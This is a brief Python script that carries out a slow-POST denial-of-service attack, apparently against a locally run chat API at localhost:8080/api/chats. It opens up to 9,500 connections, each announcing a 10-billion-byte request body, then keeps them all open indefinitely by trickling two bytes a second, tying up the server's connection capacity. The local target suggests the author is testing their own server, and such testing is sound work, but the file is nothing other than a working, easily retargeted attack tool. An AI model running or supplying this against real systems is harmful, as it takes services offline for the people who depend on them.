import socket
import time


def main():
    '''Amount of connections to open'''
    cONNECTIONSAMOUNT = 9500

    '''Store all the connections'''
    cONNECTIONSLIST = []

    for x in range(cONNECTIONSAMOUNT):

        try:
            tcp_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            tcp_client.connect(('localhost', 8080))
            cONNECTIONSLIST.append(tcp_client)

            '''Send Post request and wait .01 second to slow it down'''
            tcp_client.sendall(
                b"POST /api/chats HTTP/1.1\r\nContent-Length: 10000000000\r\nContent-Type: application/json\r\n\r\n")

            time.sleep(0.01)

        except Exception:
            continue

    print("Opened" + str(len(cONNECTIONSLIST)) + " connections. Now keeping them open ")

    '''Keep the connection to the server open forever'''
    while True:
        for tcp_client in cONNECTIONSLIST:
            try:
                '''Send bytes to each connection'''
                tcp_client.sendall(b'hi')

            except Exception:
                continue
        time.sleep(1)


if __name__ == "__main__":
    main()